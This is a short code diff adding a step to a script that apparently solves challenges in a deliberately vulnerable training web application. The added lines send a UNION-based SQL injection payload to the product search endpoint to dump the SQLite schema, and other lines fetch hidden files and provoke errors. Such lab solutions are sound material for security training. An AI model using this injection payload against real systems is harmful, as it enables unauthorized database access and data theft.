@@ -7,6 +7,8 @@ import requests
 requests.get(url+'/assets/public/images/padding/19px.png')
 # ---- Confidential Document (Access a confidential document.)
 requests.get(url+'/ftp/acquisitions.md')
+# ---- Database Schema (Exfiltrate the entire DB schema definition via SQL Injection.)
+requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT sql,\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM sqlite_master--'})
 # ---- Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)
 requests.get(url+'/rest/qwertz')
 # ---- Missing Encoding (Retrieve the photo of Bjoern's cat in "melee combat-mode".)
